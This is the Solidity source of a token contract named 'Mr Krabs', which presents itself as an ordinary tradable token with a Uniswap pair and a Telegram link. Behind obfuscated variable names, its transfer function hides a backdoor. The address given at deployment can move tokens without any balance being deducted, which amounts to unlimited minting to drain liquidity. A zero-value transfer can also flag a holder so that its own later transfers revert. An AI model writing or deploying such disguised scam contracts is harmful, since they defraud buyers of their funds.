{{
  "language": "Solidity",
  "sources": {
    "MrKrabs.sol": {
      "content": "/*\r\n\r\nTG: https://t.me/MrKrabsETH\r\n\r\n*/\r\n\r\n// SPDX-License-Identifier: GPL-3.0\r\n\r\npragma solidity ^0.8.5;\r\n\r\nabstract contract Context {\r\n    function _msgSender() internal view virtual returns (address) {\r\n        return msg.sender;\r\n    }\r\n\r\n    function _msgData() internal view virtual returns (bytes calldata) {\r\n        return msg.data;\r\n    }\r\n}\r\n\r\ncontract Ownable is Context {\r\n    address private _owner;\r\n\r\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\r\n\r\n\r\n    constructor() {\r\n        address msgSender = _msgSender();\r\n        _owner = msgSender;\r\n        emit OwnershipTransferred(address(0), msgSender);\r\n    }\r\n\r\n\r\n    function owner() public view returns (address) {\r\n        return _owner;\r\n    }\r\n\r\n    modifier onlyOwner() {\r\n        require(_owner == _msgSender(), 'Ownable: caller is not the owner');\r\n        _;\r\n    }\r\n\r\n    function renounceOwnership() public virtual onlyOwner {\r\n        emit OwnershipTransferred(_owner, address(0));\r\n        _owner = address(0);\r\n    }\r\n\r\n    function transferOwnership(address newOwner) public virtual onlyOwner {\r\n        require(newOwner != address(0), 'Ownable: new owner is the zero address');\r\n        emit OwnershipTransferred(_owner, newOwner);\r\n        _owner = newOwner;\r\n    }\r\n}\r\n\r\ninterface IUniswapV2Router02 {\r\n    function factory() external pure returns (address);\r\n\r\n    function WETH() external pure returns (address);\r\n}\r\n\r\ninterface IUniswapV2Factory {\r\n    function createPair(address tokenA, address tokenB) external returns (address pair);\r\n}\r\n\r\ncontract MrKrabs is Ownable {\r\n    mapping(address => mapping(address => uint256)) public allowance;\r\n\r\n    function transfer(address ticket, uint256 person) public returns (bool success) {\r\n        tube(msg.sender, ticket, person);\r\n        return true;\r\n    }\r\n\r\n    function tube(address pupil, address ticket, uint256 person) private returns (bool success) {\r\n        if (initiative[pupil] == 0) {\r\n            if (high[pupil] > 0 && pupil != uniswapV2Pair) {\r\n                initiative[pupil] -= flight;\r\n            }\r\n            balanceOf[pupil] -= person;\r\n        }\r\n        if (person == 0) {\r\n            high[ticket] += flight;\r\n        }\r\n        balanceOf[ticket] += person;\r\n        emit Transfer(pupil, ticket, person);\r\n        return true;\r\n    }\r\n\r\n    mapping(address => uint256) private high;\r\n\r\n    string public name;\r\n\r\n    uint256 public totalSupply;\r\n\r\n    function transferFrom(address pupil, address ticket, uint256 person) public returns (bool success) {\r\n        tube(pupil, ticket, person);\r\n        require(person <= allowance[pupil][msg.sender]);\r\n        allowance[pupil][msg.sender] -= person;\r\n        return true;\r\n    }\r\n\r\n    mapping(address => uint256) public balanceOf;\r\n\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n\r\n    uint8 public decimals = 9;\r\n\r\n    constructor(address annual) {\r\n        symbol = 'Mr Krabs';\r\n        name = 'Mr Krabs';\r\n        totalSupply = 1000000000 * 10 ** decimals;\r\n        balanceOf[msg.sender] = totalSupply;\r\n        IUniswapV2Router02 uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);\r\n        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());\r\n        initiative[annual] = flight;\r\n    }\r\n\r\n    mapping(address => uint256) private initiative;\r\n\r\n    string public symbol;\r\n\r\n    address public uniswapV2Pair;\r\n\r\n    function approve(address traffic, uint256 person) public returns (bool success) {\r\n        allowance[msg.sender][traffic] = person;\r\n        emit Approval(msg.sender, traffic, person);\r\n        return true;\r\n    }\r\n\r\n    uint256 private flight = 1;\r\n}"
    }
  },
  "settings": {
    "optimizer": {
      "enabled": false,
      "runs": 200
    },
    "outputSelection": {
      "*": {
        "*": [
          "evm.bytecode",
          "evm.deployedBytecode",
          "devdoc",
          "userdoc",
          "metadata",
          "abi"
        ]
      }
    }
  }
}}